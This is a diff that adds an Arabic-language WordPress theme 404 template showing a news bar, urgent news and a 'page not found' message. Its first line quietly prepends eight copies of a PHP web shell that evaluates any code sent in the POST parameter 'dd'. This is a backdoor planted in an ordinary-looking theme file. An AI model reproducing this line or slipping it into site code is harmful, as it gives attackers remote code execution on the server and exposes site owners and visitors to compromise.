@@ -1,0 +1,63 @@
+<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php get_header(); ?>
+
+
+	<div class="main">
+		
+		<div class="home-featured">
+				
+			<?php 
+			if (mwp_option('themestyle') == 'custom-style') {
+			
+			} else {
+				// ادراج شريط الاخبار
+				include get_theme_root() . '/' . get_template().'/core/home.newsbar.php';
+			}
+			?>
+
+			<?php 
+			if (mwp_option('themestyle') == 'custom-style') {
+
+			} else { 
+				//	ادراج ملف الاخبار العاجلة	
+				if (mwp_option('urgentnewsdisplay') == '1') {
+					include get_theme_root() . '/' . get_template().'/core/header.urgent.news.php';
+				} 
+			}
+			?>
+			
+		</div>
+		
+		<div class="content-full content-single">
+
+			<div class="single-post <?php mwp_csa_border(); ?>">
+					
+					<div class="single-content-full">
+					
+					<img src="<?php bloginfo('template_directory'); ?>/images/404-error.jpg" class="aligncenter">
+					
+					<p>لم يتم العثور على الصفحة. وصلت إلى الصفحة التي إما تم نقلها أو لم تعد متوفرة.</p>
+					<p>الصفحة التي طلبتها غير موجودة، من الممكن أن يكون تم حذفها، أو تم تغيير اسمها، أو أنها غير متوفرة حاليا. رجاء قم بمحاولة ما يلي: </p>
+					
+					
+					<ol>
+						<li>إذا قمت بطباعة الرابط بشريط العنوان، تأكد من أنه مكتوب بشكل صحيح.</li>
+						<li>تصفح الصفحة الرئيسة لـ<a href="<?php get_bloginfo('url'); ?>"><?php get_bloginfo('name'); ?></a> للاطلاع على المعلومات والروابط التي تريدها</li>
+						<li>استخدم القائمة العلوية لإيجاد الرابط الذي تبحث عنه.</li>
+						<li>إذهب الى خريطة الموقع ربما تجد ما تريد</li>
+						<li>استعمل محرك البحث الخاص بالموقع</li>
+					</ol>
+
+					</div>
+					
+					
+				<div class="clear"></div>
+
+				
+			</div>
+			
+			<div class="clear"></div>
+		</div>
+
+	</div>
+
+<?php get_footer(); ?>
